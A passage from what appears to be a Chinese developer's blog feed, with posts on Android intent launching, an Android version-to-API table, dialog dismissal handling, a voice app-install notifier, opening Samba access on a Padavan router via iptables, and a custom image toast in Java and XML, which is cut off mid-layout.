class="keyword">try</span>&#123;</span><br><span class="line">    context.startActivity(Intent.parseUri(data, Intent.URI_INTENT_SCHEME));</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">  &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">  e.printStackTrace() ;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>来自<a href="https://github.com/ekibun/OpenInApp" target="_blank" rel="noopener">https://github.com/ekibun/OpenInApp</a>  </p><p>简单打包了两个apk <a href="openWithAlipay.zip">用支付宝打开.apk</a> | <a href="openWithWeChat.zip">用微信打开.apk (需要root)</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>安卓版本与API对照</title>
      <link href="/2021/android-ban-ben-yu-api-dui-zhao/"/>
      <url>/2021/android-ban-ben-yu-api-dui-zhao/</url>
      
        <content type="html"><![CDATA[<p>安卓版本与API Level</p><a id="more"></a><table><thead><tr><th align="center">API</th><th align="center">Android版本</th><th align="center">名称</th><th align="center">迭代版本</th></tr></thead><tbody><tr><td align="center">33</td><td align="center">13</td><td align="center">Android13 (Tiramisu)</td><td align="center"></td></tr><tr><td align="center">32</td><td align="center">12L</td><td align="center">Android12L</td><td align="center"></td></tr><tr><td align="center">31</td><td align="center">12</td><td align="center">Android 12(S)</td><td align="center"></td></tr><tr><td align="center">30</td><td align="center">11</td><td align="center">Android 11(R)</td><td align="center"></td></tr><tr><td align="center">29</td><td align="center">10</td><td align="center">Android 10(Q)</td><td align="center"></td></tr><tr><td align="center">28</td><td align="center">9</td><td align="center">Pie</td><td align="center"></td></tr><tr><td align="center">27</td><td align="center">8.1</td><td align="center">Oreo</td><td align="center"></td></tr><tr><td align="center">26</td><td align="center">8.0</td><td align="center">Oreo</td><td align="center"></td></tr><tr><td align="center">25</td><td align="center">7.1</td><td align="center">Nougat</td><td align="center">7.1.1 7.1.2</td></tr><tr><td align="center">24</td><td align="center">7.0</td><td align="center">Nougat</td><td align="center"></td></tr><tr><td align="center">23</td><td align="center">6.0</td><td align="center">Marshmallow</td><td align="center">6.0.1</td></tr><tr><td align="center">22</td><td align="center">5.1</td><td align="center">Lollipop</td><td align="center">5.1.1</td></tr><tr><td align="center">21</td><td align="center">5.0</td><td align="center">Lollipop</td><td align="center">5.0.1 5.0.2</td></tr><tr><td align="center">20</td><td align="center">4.4w</td><td align="center">Wear</td><td align="center">4.4w.1 4.4w.2</td></tr><tr><td align="center">19</td><td align="center">4.4</td><td align="center">Kit Kat</td><td align="center">4.4.1 4.4.2 4.4.3 4.4.4</td></tr><tr><td align="center">18</td><td align="center">4.3</td><td align="center">Jelly Bean</td><td align="center">4.3.1</td></tr><tr><td align="center">17</td><td align="center">4.2</td><td align="center">Jelly Bean</td><td align="center">4.2.1 4.2.2</td></tr><tr><td align="center">16</td><td align="center">4.1</td><td align="center">Jelly Bean</td><td align="center">4.1.1 4.1.2</td></tr><tr><td align="center">15</td><td align="center">4.0.3</td><td align="center">Ice Cream Sandwich</td><td align="center">4.0.4</td></tr><tr><td align="center">14</td><td align="center">4.0</td><td align="center">Ice Cream Sandwich</td><td align="center">4.0.1 4.0.2</td></tr><tr><td align="center">13</td><td align="center">3.2</td><td align="center">Honeycomb</td><td align="center">3.2.1 3.2.2 3.2.3 3.2.4 3.2.5 3.2.6</td></tr><tr><td align="center">12</td><td align="center">3.1</td><td align="center">Honeycomb</td><td align="center"></td></tr><tr><td align="center">11</td><td align="center">3.0</td><td align="center">Honeycomb</td><td align="center"></td></tr><tr><td align="center">10</td><td align="center">2.3.3</td><td align="center">Gingerbread</td><td align="center">2.3.4 2.3.5 2.3.6 2.3.7</td></tr><tr><td align="center">9</td><td align="center">2.3</td><td align="center">Gingerbread</td><td align="center">2.3.1 2.3.2</td></tr><tr><td align="center">8</td><td align="center">2.2</td><td align="center">Froyo</td><td align="center">2.2.1 2.2.2 2.2.3</td></tr><tr><td align="center">7</td><td align="center">2.1</td><td align="center">Eclair</td><td align="center"></td></tr><tr><td align="center">6</td><td align="center">2.0.1</td><td align="center">Eclair</td><td align="center"></td></tr><tr><td align="center">5</td><td align="center">2.0</td><td align="center">Eclair</td><td align="center"></td></tr><tr><td align="center">4</td><td align="center">1.6</td><td align="center">Donut</td><td align="center"></td></tr><tr><td align="center">3</td><td align="center">1.5</td><td align="center">Cupcake</td><td align="center"></td></tr><tr><td align="center">2</td><td align="center">1.1</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">1</td><td align="center">1.0</td><td align="center"></td><td align="center"></td></tr></tbody></table><p>从安卓10起谷歌不再使用甜品命名，改为Android+数字<br>VERSION CODE仍是从Q开始字母顺延</p><blockquote><p>参考 <a href="https://blog.csdn.net/chenmiaoqin950606/article/details/78959683" target="_blank" rel="noopener">Android API Level对应Android版本一览表- 红壶吃猬队</a> | <a href="https://blog.csdn.net/qq15577969/article/details/109563685" target="_blank" rel="noopener">Android各版本代号和API级别对照表-安陽</a> | <a href="https://baike.baidu.com/item/Android%E5%8E%86%E5%8F%B2%E7%89%88%E6%9C%AC" target="_blank" rel="noopener">Android历史版本_百度百科</a> | <a href="https://blog.nyanon.online/archives/170/" target="_blank" rel="noopener">Android版本和API - 话梅糖の随笔</a>  </p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android Dialog外部点击事件</title>
      <link href="/2020/an-zhuo-dialog-wai-bu-dian-ji/"/>
      <url>/2020/an-zhuo-dialog-wai-bu-dian-ji/</url>
      
        <content type="html"><![CDATA[<p>&ensp;&ensp;在一些单独Dialog就是Activity的情况会用到  </p><a id="more"></a>  <p>取消dialog外部点击事件，点击dialog外部时不会被dismiss</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AlertDialog.Builder builder = <span class="keyword">new</span> AlertDialog.Builder(<span class="keyword">this</span>);</span><br><span class="line">builder.setCancelable(<span class="keyword">false</span>)</span><br></pre></td></tr></table></figure><p>当dialog取消时执行其他事件（关闭Activity</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">builder.setOnDismissListener(<span class="keyword">new</span> DialogInterface.OnDismissListener() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onDismiss</span><span class="params">(DialogInterface dialogInterface)</span> </span>&#123;</span><br><span class="line">        finish();</span><br><span class="line">     &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>妙啊 应用安装通知</title>
      <link href="/2020/miaoa-yousa/"/>
      <url>/2020/miaoa-yousa/</url>
      
        <content type="html"><![CDATA[<p>&ensp;&ensp;很早之前酷安上有几个叫妙啊的应用，应用安装后会有语音提示，一直用着，原版应用用的IntentService，在现在的miui上不等声音放完后台就会被系统杀掉，有点烦，最近看泠鸢直播，鸟连说了两次妙啊，就她了，用鸟的语音把这个软件复刻一下，顺便换成鸟的妙啊，真是妙啊<img src="/img/preloader.gif" data-original="/coolapk-emotion/65_coshuaji.gif" alt>   <a id="more"></a>    </p><h4 id="软件功能"><a href="#软件功能" class="headerlink" title="软件功能"></a>软件功能</h4><ol><li><strong>设置自启动</strong><br>软件需要自启动权限才能保证每次收到软件安装完成都发出提示<a href="@onWhiteListSetting">点击设置</a></li><li><strong>允许软件后台运行</strong><br>请把软件添加到电池优化白名单，原生/类原生设置，其他ROM请自行设置<a href="@onACTION_BATTERY_OPTIMIZATIONS">点击设置</a></li><li><strong>应用程序设置</strong><br>你可以<a href="@toSelfSetting">点击此处</a>跳转到应用程序设置查看上面设置是否生效  </li></ol><p>&ensp;&ensp;完成上面设置大部分手机就能正常使用了</p><h4 id="自定义声音功能区"><a href="#自定义声音功能区" class="headerlink" title="自定义声音功能区"></a>自定义声音功能区</h4><table><thead><tr><th align="center"><a href="@onCustomize">自定义</a></th><th align="center"><a href="@onPlaySound">试听</a></th><th align="center"><a href="@onDefault">默认</a></th></tr></thead></table><h4 id="在线声音"><a href="#在线声音" class="headerlink" title="在线声音"></a>在线声音</h4><table><thead><tr><th align="center">泠鸢yousa</th><th align="center"><a href="yousa.mp3?play">播放</a></th><th align="center"><a href="yousa.mp3?set">设置</a></th></tr></thead><tbody><tr><td align="center">萝莉</td><td align="center"><a href="miaoa_girl.mp3?play">播放</a></td><td align="center"><a href="miaoa_girl.mp3?set">设置</a></td></tr><tr><td align="center">司马懿</td><td align="center"><a href="miaoa_sima.mp3?play">播放</a></td><td align="center"><a href="miaoa_sima.mp3?set">设置</a></td></tr><tr><td align="center">默认</td><td align="center"><a href="miaoa.mp3?play">播放</a></td><td align="center"><a href="miaoa.mp3?set">设置</a></td></tr><tr><td align="center">hanser 哎哟卧槽</td><td align="center"><a href="hanser-whoops.mp3?play">播放</a></td><td align="center"><a href="hanser-whoops.mp3?set">设置</a></td></tr><tr><td align="center">你有憨色的来电</td><td align="center"><a href="hanser-call.mp3?play">播放</a></td><td align="center"><a href="hanser-call.mp3?set">设置</a></td></tr><tr><td align="center">嘟嘟噜（憨）</td><td align="center"><a href="hanser-dudu.mp3?play">播放</a></td><td align="center"><a href="hanser-dudu.mp3?set">设置</a></td></tr><tr><td align="center">hanser烦死你</td><td align="center"><a href="hanser.mp3?play">播放</a></td><td align="center"><a href="hanser.mp3?set">设置</a></td></tr></tbody></table><h4 id="关于"><a href="#关于" class="headerlink" title="关于"></a>关于</h4><p>&ensp;&ensp;如上，制作这个app的目的就是上面说的，原版app酷安早已下架，下面会提供下载  </p><p><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/miaoa-yousa/1608990459923.png" alt="img">  </p><p>&ensp;&ensp;泠鸢yousa的声音来自<a href="https://m.bilibili.com/video/BV1Py4y1U7yi" target="_blank" rel="noopener">Bilibili: BV1Py4y1U7yi</a>  </p><iframe src="//player.bilibili.com/player.html?aid=798321666" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"> </iframe>  <p>&ensp;&ensp;在线声音”萝莉”、”司马懿”、”默认”均来自原版app  </p><p>&ensp;&ensp;hanser声音来自<a href="https://m.bilibili.com/video/BV1wi4y1P7aD" target="_blank" rel="noopener">Bilibili: BV1wi4y1P7aD</a>@毕加索de猫猫，原视频有更多的声音（hanser烦死你是立体声，感觉绕过绕绕过去的很棒，一起添加了）</p><p>程序：v1.0.3<br>源码：<a href="https://github.com/gddhy/miaoa_yousa/" target="_blank" rel="noopener">Github</a><br>下载：<a href="https://res.gddhy.net/app/release/app-release_V1.0.3.apk?c=miaoa_yousa" target="_blank" rel="noopener">点击下载</a><br>原程序：<a href="https://res.gddhy.net/app/release/me.drakeet.miaoa_1.0.4.apk?c=miaoa_yousa" target="_blank" rel="noopener">点击下载</a>  </p><p>更新日志：<br>v1.0.3: 增加本地/网页切换<br>v1.0.2: 更换设置自启动方式<br>v1.0.1: 增加jsdelivr音频链接  </p>]]></content>
      
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>老毛子固件允许同级设备访问smb</title>
      <link href="/2020/padavan-wan-smb/"/>
      <url>/2020/padavan-wan-smb/</url>
      
        <content type="html"><![CDATA[<p>&ensp;&ensp;老毛子(Padavan)路由器固件，功能多，好用<br>&ensp;&ensp;新路由3有usb3.0的接口，刷了老毛子固件后，挂一块移动硬盘在家里用时局域网读写文件也能跑到30mb/s的速度，也很不错了   <a id="more"></a><br>&ensp;&ensp;老毛子设置里可以允许ftp在新路由的局域网和同级路由访问（新路由不是主路由），并没有找到开放smb访问的设置，导致只能在局域网访问<br>&ensp;&ensp;在CSDN上找到这个可以打开Padavan的smb同级设备访问  </p><p>进入路由器后台<a href="http://192.168.123.1/" target="_blank" rel="noopener">http://192.168.123.1/</a></p><ul><li>进入 高级设置-自定义设置 - 脚本<br>点开 <strong>“在防火墙规则 (Emong’s Qos) 启动后执行: “</strong>,在最下面一行 <strong>logger -t “【防火墙规则】” “脚本完成”</strong> 这一行前面加入如下脚本  </li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">放行SAMBA端口</span></span><br><span class="line">logger -t "【SAMBA服务器】" "允许SAMBA访问"</span><br><span class="line">iptables -I INPUT 1 -p udp -m multiport --dport 137,138 -j ACCEPT </span><br><span class="line">iptables -I INPUT 1 -p tcp -m state --state NEW -m multiport --dport 139,445 -j ACCEPT</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">logger -t <span class="string">"【防火墙规则】"</span> <span class="string">"脚本完成"</span>  <span class="comment">#(原本有的一行，不用加入)</span></span></span><br></pre></td></tr></table></figure><ul><li>进入 高级设置-自定义设置 - 脚本<br>点开 <strong>“自定义脚本0(功能配置): “</strong> ,找到最下面 <strong>“#↑↑↑功能详细设置↑↑↑ “</strong> , 在这一行前面加入如下脚本  </li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">开启wan口eth2.2端口的samba共享</span></span><br><span class="line">sed -i 's/interfaces =.*/interfaces = eth2.2 br0/' /etc/smb.conf</span><br><span class="line">/bin/kill -9 `pidof smbd`</span><br><span class="line">smbd -D -s /etc/smb.conf</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">↑↑↑功能详细设置↑↑↑    <span class="comment">#(原本有的一行，不用加入)</span></span></span><br></pre></td></tr></table></figure><p>&ensp;&ensp;其中，eth2.2 是wan口地址的接口的名称。  </p><p>&ensp;&ensp;保存脚本后重启路由器，重启后即可在路由器同级设备访问smb</p><blockquote><p>转自<a href="https://blog.csdn.net/shile/article/details/54512070" target="_blank" rel="noopener">Padavan 路由器系统如何放开wan口的samba访问 - 水墨风光</a></p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>气泡吐司</title>
      <link href="/2020/qi-pao-tu-si/"/>
      <url>/2020/qi-pao-tu-si/</url>
      
        <content type="html"><![CDATA[<p>&ensp;&ensp;开始看到吐司提示，是在添加在线卡面时，看到 奶油话梅糖 介绍里带了自己的博客，好奇进去看了下，看到这个感觉不错就收藏了  </p><a id="more"></a>  <p>&ensp;&ensp;当时想到了一些用法，但也没急着用，看到设置随机壁纸时只有冷冰冰的”设置中”提示，感觉不太好，就用在这里了，将读到的图片设置壁纸的同时提示一下<br>&ensp;&ensp;一直没时间改代码，一直拖到最近才弄了下，在 奶油话梅糖 的基础上添加图片提示  </p><p>&ensp;&ensp;实例程序<a href="https://www.coolapk.com/apk/com.hy.sjbz" target="_blank" rel="noopener">随机壁纸</a> ，下面是源码  </p><hr><p>DiyToast.class</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DiyToast</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">showToast</span><span class="params">(Context context, String string, Uri bitmapUri)</span> </span>&#123;</span><br><span class="line">        showToast(context,string,MainActivity.getBitmapFromUri(bitmapUri,context));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">showToast</span><span class="params">(Context context, String string)</span></span>&#123;</span><br><span class="line">        View toastRoot = LayoutInflater.from(context).inflate(</span><br><span class="line">                R.layout.my_toast, <span class="keyword">null</span>, <span class="keyword">false</span>);</span><br><span class="line">        TextView tv = (TextView) toastRoot.findViewById(R.id.TextViewInfo);</span><br><span class="line">        Toast toast = Toast.makeText(context, string, Toast.LENGTH_LONG);<span class="comment">// 展示Toast</span></span><br><span class="line">        toast.setView(toastRoot);</span><br><span class="line">        tv.setText(string);</span><br><span class="line">        toast.show();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">showToast</span><span class="params">(Context context, String string, <span class="keyword">final</span> Bitmap bitmap)</span> </span>&#123;</span><br><span class="line">        View toastRoot = LayoutInflater.from(context).inflate(</span><br><span class="line">                R.layout.my_toast, <span class="keyword">null</span>, <span class="keyword">false</span>);</span><br><span class="line">        TextView tv = (TextView) toastRoot.findViewById(R.id.TextViewInfo);</span><br><span class="line">        LinearLayout linearLayout =toastRoot.findViewById(R.id.rootLayout);</span><br><span class="line">        Toast toast = Toast.makeText(context, string, Toast.LENGTH_SHORT);<span class="comment">// 展示Toast</span></span><br><span class="line">        toast.setView(toastRoot);</span><br><span class="line">        tv.setText(string);</span><br><span class="line">        tv.setTextColor(getBitmapColorIsDark(bitmap)?Color.WHITE:Color.BLACK);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> width = bitmap.getWidth();</span><br><span class="line">        <span class="keyword">int</span> height = bitmap.getHeight();</span><br><span class="line">        <span class="comment">// 设置想要的大小</span></span><br><span class="line">        <span class="keyword">int</span> newWidth;</span><br><span class="line">        <span class="keyword">int</span> newHeight;</span><br><span class="line">        <span class="keyword">if</span>(width&gt;height)&#123;</span><br><span class="line">            newWidth = <span class="number">720</span>;</span><br><span class="line">            newHeight = height*<span class="number">720</span>/width;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            newWidth = width*<span class="number">720</span>/height;</span><br><span class="line">            newHeight = <span class="number">720</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 计算缩放比例</span></span><br><span class="line">        <span class="keyword">float</span> scaleWidth = ((<span class="keyword">float</span>) newWidth) / width;</span><br><span class="line">        <span class="keyword">float</span> scaleHeight = ((<span class="keyword">float</span>) newHeight) / height;</span><br><span class="line">        Matrix matrix = <span class="keyword">new</span> Matrix();</span><br><span class="line">        matrix.postScale(scaleWidth, scaleHeight);</span><br><span class="line">        Bitmap mbitmap = Bitmap.createBitmap(toRoundCorner(bitmap,<span class="number">50</span>), <span class="number">0</span>, <span class="number">0</span>, width, height, matrix, <span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        Resources resources = context.getResources();</span><br><span class="line">        BitmapDrawable drawable = <span class="keyword">new</span> BitmapDrawable(resources, mbitmap);</span><br><span class="line"></span><br><span class="line">        linearLayout.setBackground(drawable);</span><br><span class="line"></span><br><span class="line">        toast.show();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//http://hautxsh.iteye.com/blog/1495012</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> Bitmap <span class="title">toRoundCorner</span><span class="params">(Bitmap bitmap, <span class="keyword">int</span> pixels)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        Bitmap output = Bitmap.createBitmap(bitmap.getWidth(), bitmap.getHeight(), Bitmap.Config.ARGB_8888);</span><br><span class="line">        Canvas canvas = <span class="keyword">new</span> Canvas(output);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="keyword">int</span> color = <span class="number">0xff424242</span>;</span><br><span class="line">        <span class="keyword">final</span> Paint paint = <span class="keyword">new</span> Paint();</span><br><span class="line">        <span class="keyword">final</span> Rect rect = <span class="keyword">new</span> Rect(<span class="number">0</span>, <span class="number">0</span>, bitmap.getWidth(), bitmap.getHeight());</span><br><span class="line">        <span class="keyword">final</span> RectF rectF = <span class="keyword">new</span> RectF(rect);</span><br><span class="line">        <span class="keyword">final</span> <span class="keyword">float</span> roundPx = pixels;</span><br><span class="line"></span><br><span class="line">        paint.setAntiAlias(<span class="keyword">true</span>);</span><br><span class="line">        canvas.drawARGB(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        paint.setColor(color);</span><br><span class="line">        canvas.drawRoundRect(rectF, roundPx, roundPx, paint);</span><br><span class="line"></span><br><span class="line">        paint.setXfermode(<span class="keyword">new</span> PorterDuffXfermode(android.graphics.PorterDuff.Mode.SRC_IN));</span><br><span class="line">        canvas.drawBitmap(bitmap, rect, rect, paint);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> output;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取图片字体颜色 黑false 白true</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">getBitmapColorIsDark</span> <span class="params">(Bitmap bitmap)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> w = bitmap.getWidth();</span><br><span class="line">        <span class="keyword">int</span> h = bitmap.getHeight();</span><br><span class="line">        <span class="keyword">int</span>[] color = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">5</span>];</span><br><span class="line">        color[<span class="number">0</span>] = bitmap.getPixel(w / <span class="number">2</span>, h / <span class="number">2</span>);</span><br><span class="line">        color[<span class="number">1</span>] = bitmap.getPixel(w / <span class="number">4</span>, h / <span class="number">4</span>);</span><br><span class="line">        color[<span class="number">2</span>] = bitmap.getPixel(w / <span class="number">4</span>, h * <span class="number">3</span> / <span class="number">4</span>);</span><br><span class="line">        color[<span class="number">3</span>] = bitmap.getPixel(w * <span class="number">3</span> / <span class="number">4</span>, h / <span class="number">4</span>);</span><br><span class="line">        color[<span class="number">4</span>] = bitmap.getPixel(w * <span class="number">3</span> / <span class="number">4</span>, h * <span class="number">3</span> / <span class="number">4</span>);</span><br><span class="line">        <span class="keyword">int</span> c = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (isDark(color[i])) c++;</span><br><span class="line">            <span class="keyword">else</span> c--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> c &gt;= <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//判断颜色深浅</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">isDark</span><span class="params">(<span class="keyword">int</span> color)</span> </span>&#123;</span><br><span class="line">        Double r,g,b;</span><br><span class="line">        r = (<span class="keyword">double</span>) Color.red(color);</span><br><span class="line">        g = (<span class="keyword">double</span>) Color.green(color);</span><br><span class="line">        b = (<span class="keyword">double</span>) Color.blue(color);</span><br><span class="line">        <span class="keyword">return</span> isDark(r,g,b);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 根据RGB值判断 深色与浅色</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> r</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> g</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> b</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">isDark</span><span class="params">(Double r, Double g, Double b)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> !(r * <span class="number">0.299</span> + g * <span class="number">0.578</span> + b * <span class="number">0.114</span> &gt;= <span class="number">192</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>res/layout/my_toast.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">LinearLayout</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"match_parent"</span> &gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">LinearLayout</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:background</span>=<span class="string">"@drawable/shaper_toast_show_back"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:orientation</span>=<span class="string">"horizontal"</span> &gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">LinearLayout</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:id</span>=<span class="string">"@+id/rootLayout"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_height</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_margin</span>=<span class="string">"15sp"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:gravity</span>=<span class="string">"bottom|center"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:orientation</span>=<span class="string">"vertical"</span> &gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">TextView</span></span></span><br><span class="line"><span class="tag">                <span class="attr">android:id</span>=<span class="string">"@+id/TextViewInfo"</span></span></span><br><span class="line"><span class="tag">                <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">                <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">                <span class="attr">android:layout_marginBottom</span>=<span class="string">"15sp"</span></span></span><br><span class="line"><span class="tag">                <span class="attr">android:layout_marginTop</span>=<span 